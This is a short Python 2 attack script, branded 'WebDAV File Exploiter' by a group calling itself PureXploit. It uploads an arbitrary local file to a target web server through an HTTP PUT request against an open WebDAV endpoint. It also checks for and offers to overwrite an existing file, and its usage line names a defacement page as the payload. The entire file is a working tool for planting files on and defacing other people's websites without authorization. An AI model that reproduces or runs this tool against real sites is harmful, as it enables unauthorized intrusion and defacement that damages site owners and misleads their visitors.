#!/usr/bin/python

import requests
import string
import random
import sys
import os

os.system("clear")
print("""
 ######################################
 #  Name: WebDAV File Exploiter       #
 #  Team: PureXploit                  #
 #  Author: ph.rizk                   #
 #  Date: 07-23-19                    #
 #  Page: www.facebook.com/purexploit #
 #  Github: www.github.com/purexploit #
 ######################################
""")
def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[*] Upload File Name : %s") % (sys.argv[2])
  print("[*] Uploading %d bytes, File Script") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("[!] Upload failed . . .")
    sys.exit(1)
  else:
    print("[+] File uploaded . . .")
    print("[+] PATH : "+host + nama)


def purexploit():
 print("""
 ################################

""")
 print("[*] File Target : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("[*] The File is Hidden With Target. . . .")
  rizk = raw_input("[!] Replace File Target? [Y/N] > ")
  if rizk == "Y":
   webdav()
  else:
   print("[!] Exiting Tools . . .")
   sys.exit()
 else:
   print("[*] File Target . . .")
   print("[*] Processing Upload Script . . .")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] Usage: "+sys.argv[0]+" http://Target.com ScriptDeface.html\n")
    sys.exit(0)
  else:
    purexploit()
